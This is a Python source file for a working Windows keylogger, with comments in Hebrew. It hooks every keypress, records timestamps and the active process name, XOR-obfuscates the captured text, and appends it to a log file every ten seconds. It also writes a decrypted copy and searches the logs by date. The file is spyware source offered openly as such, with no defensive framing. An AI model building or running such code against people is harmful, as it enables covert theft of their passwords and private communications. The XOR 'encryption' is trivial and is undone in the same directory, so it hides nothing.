import time
import keyboard
import threading
import win32gui
import win32process
import psutil
from abc import ABC, abstractmethod
from datetime import datetime



def get_active_window():
    """ מחזיר את שם התהליך של החלון הפעיל """
    try:
        hwnd = win32gui.GetForegroundWindow()  # מזהה את החלון הפעיל
        _, pid = win32process.GetWindowThreadProcessId(hwnd)  # מקבל את ה-PID של התהליך
        process = psutil.Process(pid)  # מוצא את התהליך לפי ה-PID
        return process.name()  # מחזיר את שם התהליך
    except Exception:
        return "Unknown"


# keylogger runtime
class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self.running = False
        self.lock = threading.Lock()
        self.last_timestamp = None
        self.last_active_window = None

    def start_listening(self):
        self.running = True
        keyboard.on_press(self.record_key)

    def record_key(self, event):
        with self.lock:
            current_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
            active_window = get_active_window()

            if self.last_timestamp != current_timestamp:
                self.buffer.append(f"\n[{current_timestamp}]\n")
                self.last_timestamp = current_timestamp

            if self.last_active_window != active_window:
                self.buffer.append(f"\n(Active Window: {active_window})\n")
                self.last_active_window = active_window

            if event.name == "space":
                self.buffer.append(" ")
            elif event.name == "enter":
                self.buffer.append("\n")
            elif len(event.name) == 1:
                self.buffer.append(event.name)

    def stop_listening(self):
        self.running = False
        keyboard.unhook_all()

    def get_buffer(self) -> str:
        with self.lock:
            data = "".join(self.buffer)
            self.buffer.clear()
        return data


# Encryptor (XOR בלבד)
class Encryptor:
    def __init__(self, key=5):
        self.key = key

    def encrypt(self, data):
        return ''.join(chr(ord(char) ^ self.key) for char in data)

    def decrypt(self, encrypted_data):
        return ''.join(chr(ord(char) ^ self.key) for char in encrypted_data)


# Writer (Interface)
class Writer(ABC):
    @abstractmethod
    def write(self, data):
        pass


# Insert into file
class FileWriter(Writer):
    def __init__(self, filename="keylogger.txt"):
        self.filename = filename

    def write(self, data):
        with open(self.filename, "a", encoding="utf-8") as file:
            file.write(data + "\n")


# Manager
class KeyLoggerManager:
    def __init__(self, writers):
        self.key_logger_service = KeyLoggerService()
        self.encryptor = Encryptor()
        self.writers = writers
        self.running = False

    def run(self):
        self.running = True
        listener_thread = threading.Thread(target=self.key_logger_service.start_listening)
        writer_thread = threading.Thread(target=self.write_periodically, daemon=True)
        listener_thread.start()
        writer_thread.start()
        return listener_thread, writer_thread

    def stop(self):
        self.key_logger_service.stop_listening()
        self.running = False

    def write_periodically(self, interval=10):
        while self.running:
            time.sleep(interval)
            self.write_data()
            decrypt_and_save_to_file()

    def write_data(self):
        data = self.key_logger_service.get_buffer()
        if data:
            encrypted_data = self.encryptor.encrypt(data)
            for writer in self.writers:
                writer.write(encrypted_data)


def decrypt_and_save_to_file(input_filename="keylogger.txt", output_filename="decrypted_output.txt"):
    encryptor = Encryptor(key=5)
    with open(input_filename, "r", encoding="utf-8") as encrypted_file, \
            open(output_filename, "w", encoding="utf-8") as decrypted_file:
        for line in encrypted_file:
            decrypted_data = encryptor.decrypt(line.strip())
            decrypted_file.write(decrypted_data + "\n")


def search_content_by_date(start_date, end_date, filename="decrypted_output.txt"):
    start_date = datetime.strptime(start_date, "%Y-%m-%d %H:%M")
    end_date = datetime.strptime(end_date, "%Y-%m-%d %H:%M")
    result = []
    current_date = None

    with open(filename, "r", encoding="utf-8") as file:
        for line in file:
            if line.startswith("[") and line.endswith("]\n"):
                current_date = datetime.strptime(line.strip("[]\n"), "%Y-%m-%d %H:%M")
            elif current_date and start_date <= current_date <= end_date:
                result.append(line.strip())

    return "\n".join(result)


def main():
    file_writer = FileWriter()
    klm = KeyLoggerManager([file_writer])

    listener_thread, writer_thread = klm.run()
    while True:
        listener_thread.join()
        writer_thread.join()


if __name__ == "__main__":
    main()
